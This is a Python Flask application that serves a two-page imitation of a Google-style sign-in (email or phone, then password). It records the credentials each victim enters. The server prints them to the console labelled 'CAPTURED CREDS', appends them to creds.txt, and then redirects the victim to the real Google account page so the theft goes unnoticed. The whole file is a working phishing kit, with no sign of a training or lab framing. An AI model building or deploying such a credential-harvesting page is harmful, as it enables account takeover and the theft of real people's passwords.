from flask import Flask, render_template, request, redirect, url_for, session
import os

# Initialize Flask app
# template_folder points to 'code/templates' for HTML files
# static_folder points to 'code/' so 'code/static' and 'code/assets' can be served
app = Flask(__name__,
            template_folder='code/templates',
            static_folder='code')

# Set a secret key for session management (essential for security)
app.secret_key = os.urandom(24) # Generates a random 24-byte key

# Ensure creds.txt exists, create it if not
CREDS_FILE = 'creds.txt'
if not os.path.exists(CREDS_FILE):
    with open(CREDS_FILE, 'w') as f:
        f.write('') # Create an empty file if it doesn't exist

@app.route('/')
def index():
    """Renders the first login page (email/phone input)."""
    # Clear any previous username from the session when starting fresh
    session.pop('username', None)
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    """
    Handles the submission from the first page.
    Stores the username (email/phone) in the session and redirects to the password page.
    """
    username = request.form.get('username')
    if username:
        session['username'] = username # Store username in session
        return redirect(url_for('password_page'))
    return redirect(url_for('index')) # If no username, go back to start

@app.route('/password')
def password_page():
    """
    Renders the second login page (password input).
    Requires a username to be present in the session.
    """
    username = session.get('username')
    if not username:
        return redirect(url_for('index')) # Redirect to start if username not in session
    return render_template('password.html', username=username)

@app.route('/authenticate', methods=['POST'])
def authenticate():
    """
    Handles the submission from the second page.
    Captures username (from session) and password (from form),
    prints them to console, saves them to 'creds.txt', and then redirects.
    """
    username = session.get('username')
    password = request.form.get('password')

    if username and password:
        # Print credentials to backend console
        print("-" * 30)
        print(f"CAPTURED CREDS:")
        print(f"  User: {username}")
        print(f"  Pass: {password}")
        print("-" * 30)

        # Save credentials to creds.txt
        with open(CREDS_FILE, 'a') as f:
            f.write(f"User: {username}\n")
            f.write(f"Pass: {password}\n")
            f.write("\n") # Add an empty line for readability between entries

        # Clear session data after credentials are "captured"
        session.pop('username', None)

        # Redirect to a plausible destination (e.g., actual Google login success page)
        return redirect("https://myaccount.google.com/") # Or any other URL
    
    # If something went wrong (e.g., missing username/password), redirect to start
    return redirect(url_for('index'))

if __name__ == '__main__':
    # Run the Flask app in debug mode (remove debug=True for production)
    app.run(host='0.0.0.0', port=80, debug=True)
